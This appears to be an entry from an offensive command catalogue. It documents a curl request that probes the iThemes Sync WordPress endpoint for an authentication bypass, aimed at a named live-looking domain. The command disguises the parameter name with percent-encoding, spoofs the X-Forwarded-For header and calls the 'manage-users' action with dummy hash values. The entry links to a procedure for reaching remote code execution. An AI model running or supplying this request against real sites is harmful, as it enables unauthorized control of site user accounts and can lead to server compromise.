---
id: cmd-curl-sync-008
data: >-
  curl -s -i 'https://www.drivegrab.com/?ithemes-sync-reques%74=1' --data
  'request={"action":"manage-users","arguments":{},"user_id":"123","salt":"A","hash":"B"}'
  -H 'X-Forwarded-For: 123.1.2.3'
tags:
  - auth-bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.974Z'
verified: false
validated: true
submitted: true
---
# curl-ithemes-sync-test

## Command

```bash
curl -s -i 'https://www.drivegrab.com/?ithemes-sync-reques%74=1' --data 'request={"action":"manage-users","arguments":{},"user_id":"123","salt":"A","hash":"B"}' -H 'X-Forwarded-For: 123.1.2.3'
```

## Description

Tests iThemes-Sync endpoint with encoded URL and spoofed IP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | X-Forwarded-For header | Yes |
| `--data` | JSON request | Yes |

## Examples

### Basic Usage

```bash
curl -s -i 'https://target.com/?param=1' --data 'request={"action":"test"}'
```

## Expected Output

JSON errors or success response.

## Related

- [[Related Procedure: Achieve-RCE-via-iThemes-Sync-Bypass]]
